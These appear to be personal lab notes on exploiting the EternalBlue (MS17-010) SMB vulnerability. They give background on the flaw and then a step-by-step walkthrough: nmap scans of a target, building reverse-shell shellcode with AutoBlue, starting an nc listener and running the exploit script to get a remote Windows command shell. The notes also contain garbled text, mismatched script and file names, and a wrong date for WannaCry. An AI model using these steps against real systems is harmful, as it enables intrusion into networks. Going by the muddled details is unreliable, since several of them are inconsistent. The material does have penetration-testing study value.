#### Exploiting windows MS17-010
SMB Vulnerability(EternalBby the NSAlue)
- EternalBlue (MS17-010/CVE-2017-0144) is the name given to a collection of windows vulnerabilities and exploits that allow attackers to remotely execute arbitary code and gain access to a Windows system and consequently the network that the target system is a part of.
- EternalBlue exploit was developed  NSA [National Security Agency to take advantages of the MS17-010 vulnerability and was leaked to the public by a hacker group called the Shadow Brokers in 2017.
- EternalBlue exploit takes advantage of a vulnerability in the windows SMBv1 protocol that allows attackers to send specially crafted packets that consequently facilitate the execution of arbitary commands
- The Eternalblue exploit was used in the WannaCry ransomware attack on June 27,2017 to exploit other Windows systems accross networks with the objective of spreading the ransomware to as many systems as possible.
#### This vulnerability affects multiple versions of windows
- Windows Vista
- Windows 7
- Windows Server 2008
- Windows 8.1
- Windows Server 2012
- Windows 10
- Windows Server 2016
#### Tools
- AutoBlue-MS17-010 (github)
- Metasploit modules

#### Exploiting EternalBlue
- sudo nmap -sV -p 445 -O 10.10.10.12 [As eternalblue is smb based so port 445 is used]
- nmap -sV -sS -p 445 --script=smb-vuln-ms17-010 10.10.10.12 [We can confirm that by using this nmap script]
- 
#### Auto-blue tools usages for windows server 8
- git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
- pip install -r requirements.txt
- go to the into the repository
- cd shellcode
- chmod +x shell_preb.sh
- ./shell_preb.sh
- say y for permission,give attacker ip and listening port for 64x and 86x for both etc
- this will generate bin file remember the name in this case it is sc_x64_msf.bin and sc_x86_msf.bin
- we find this bin file in current directory [ in this case shellcode directory]
- cd .. [back one directory]
- here we find python files give executable permissions in this case eternalblue_exploit8.py as our exploit server is 8
- start listener in attacker machine "nc -nvlp port" use same port previously used
- python3 eternalblue_exploit7.py 10.10.10.12 shellcode/sc_x64.bin
- this will give us windows cmd in our attacker machine
#### metasploit module
- in msfmodule search eternalblue
- using auxiliary module we can make sure the vulnerability exist or not
- using exploit module we can exploit it


